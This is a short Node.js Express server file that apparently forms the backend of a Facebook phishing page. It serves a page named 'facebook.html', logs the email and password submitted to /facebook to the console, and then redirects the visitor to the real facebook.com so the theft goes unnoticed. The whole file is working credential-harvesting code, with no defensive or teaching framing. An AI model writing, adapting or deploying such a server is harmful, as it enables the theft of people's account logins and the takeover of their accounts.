const express = require("express");

const app = express();

var port = 3000;

app.use(express.urlencoded({ extended: false }));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/templates/facebook.html");
});

app.post("/facebook", (req, res) => {
  console.log("Email:", req.body.email);
  console.log("Password: ", req.body.password);
  return res.redirect('http://www.facebook.com');
  res.end()
  
});

app.listen(3000, "0.0.0.0", err => {
  if (err) throw err;

  console.log(`Server listening on port ${port}`);
});
